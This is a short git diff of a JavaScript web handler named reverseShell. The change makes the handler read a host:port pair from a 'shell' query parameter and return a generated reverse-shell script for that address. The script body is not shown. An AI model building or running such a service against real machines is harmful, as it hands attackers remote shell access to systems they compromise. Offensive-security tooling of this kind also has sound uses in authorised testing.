@@ -31,9 +31,9 @@ fi`;
 	}, '');
 };
 
-const reverseShell = req => {
-	const [host, port] = req.url.substr(1).split(':');
-	return usage + (host && port && generateScript(host, port));
+const reverseShell = (req, res) => {
+  const [host, port] = req.query.shell.split(':');
+  res.send(usage + (host && port && generateScript(host, port)))
 };
 
 module.exports = reverseShell;
